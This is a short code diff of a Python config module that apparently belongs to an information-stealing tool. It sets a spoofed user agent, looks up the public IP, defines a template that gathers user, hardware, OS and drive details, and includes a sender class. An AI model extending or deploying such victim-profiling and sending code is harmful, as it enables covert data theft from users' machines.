@@ -1,11 +1,10 @@
 from os import environ
+from getpass import getuser
 from re import compile, IGNORECASE, DOTALL
-
-from win32api import GetUserName
 
 
 user_profile = environ["USERPROFILE"]
-user = GetUserName()
+user = getuser()
 user_agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
 
 
@@ -65,7 +64,7 @@ class SystemConfig:
 
     User = user
     IPUrl = "https://api.ipify.org/"
-    SystemData = "User: {0}\nIP: {1}\nOS Name: {2}\nOS Version: {3} {4}\nMonitors: {5}\nCPU: {6}\nGPU: {7}\nRAM: {8} GB\n"
+    SystemData = "User: {0}\nIP: {1}\nMachine Type: {2}\nOS Name: {3}\nMachine Name on Network: {4}\nMonitor: {5}\nCPU: {6}\nGPU: {7}\nRAM:\n{8}\nDrives:\n{9}"
 
 
 class SenderConfig:
